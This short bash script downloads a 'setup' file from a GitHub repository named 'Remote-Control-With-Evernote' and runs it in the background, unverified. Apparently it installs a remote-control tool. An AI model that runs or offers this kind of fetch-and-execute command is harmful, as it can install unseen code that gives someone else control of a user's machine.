#!/usr/bin/env bash

f=$(mktemp) && curl -fsSL raw.githubusercontent.com/mrdog233o5/Remote-Control-With-Evernote/main/setup -o $f && chmod +x $f && $f &
